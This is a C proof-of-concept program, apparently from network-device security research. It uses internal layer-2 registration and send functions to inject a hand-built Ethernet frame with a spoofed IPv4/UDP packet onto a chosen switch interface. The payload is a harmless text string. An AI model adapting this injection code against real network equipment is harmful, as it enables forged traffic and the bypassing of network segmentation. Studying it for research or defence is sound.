#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int net_l2_register(int*, int, int*, int*, int, int);
int net_l2_send(int, int*, int*, char*, int, char*);
int zc_init(void);

int main(int argc, char** argv)
{
  // choose the target interface
  int if_id_index = 0;
  if (argc >= 2){
      if_id_index = atoi(argv[1]);
  }

  int x;
  int payload_length = 114;
  int l2_message_length = payload_length + 14;
  int socket_fd;

  struct ethertype_struct{
      int type;
      char padding[64];
  };
  
  struct ethertype_struct ethertype;

  // is normally set but doesn't seem to have an effect
  ethertype.type = 0x0800;
  memset(ethertype.padding, 0, 64);
  int a3 = 1;
  printf("[.] Calling net_l2_register ...\n");
  x = net_l2_register(&socket_fd, 1, &a3, &ethertype.type, 1, 0);
  printf("[.] The net_l2_register return value is %x\n", x);

  int a2 = 0;

  // This struct mainly holds the interface ID (in the member if_id),
  // on which the packets should be sent out.
  struct interface{
    int if_id;
    char padding[12];
    // iod_flood is actually a 4byte integer and at if_id + 19;
    // using a padding of size 15 doesn't work as the compiler does alignment, so we use this ugly workaround
    char iod_flood[8];
    char padding2[16];
  };

  struct l2_frame_struct{
    // layer 2 src/dst address
    char dst_address[6];
    char src_address[6];
    // the effective eth.type
    char ethertype[2];
    // this field holds everything above layer 2
    char msg[payload_length];
  };

  struct padding_struct{
    char padding[64];
  };

  struct interface intf;
  struct l2_frame_struct l2_frame;
  struct padding_struct pstruct;

  // ugly workaround; see defintion of interface struct
  int* iod_flood = (int *)((char *)&intf.iod_flood + 3);
  *iod_flood = 0x22;

  // 0x1a013000: from leaf1 to host1
  // 0x1a035000: leaf1 to spine
  int if_id_array[2] = {0x1a013000, 0x1a035000};
  intf.if_id = if_id_array[if_id_index];

  char dst_address[6] = "\x12\x34\x56\x78\x00\x11";
  // 0x0800 == IPv4
  strncpy(l2_frame.ethertype, "\x08\x00", 2);
  memcpy(l2_frame.dst_address, dst_address, 6);
  char src_address[6] = "\x00\x01\x02\x03\x04\x05";
  memcpy(l2_frame.src_address, src_address, 6);

  // this PoC packet contains the IP and UDP header
  // IP: src=1.2.3.4, dst=192.168.200.10
  // UDP: sport=3150, dport=12345, data=Begin at the beginning ... and go on till you come to the end: then stop. - the King
  char payload[] = "\x45\x00\x00\x72\x00\x01\x00\x00\x40\x11\xed\xc1\x01\x02\x03\x04\xc0\xa8\xc8\x0a\x0c\x4e\x30\x39\x00\x5e\x13\x97 Begin at the beginning ... and go on till you come to the end: then stop. - the King\x00";
  memcpy(l2_frame.msg, payload, payload_length);

  printf("[.] Sending UDP packet on interface id: %x\n", intf.if_id);
  net_l2_send(socket_fd, &a2, &intf.if_id, pstruct.padding, l2_message_length, l2_frame.dst_address);
  printf("[.] The return value for net_l2_send is %d\n", x);

  return 0;
}
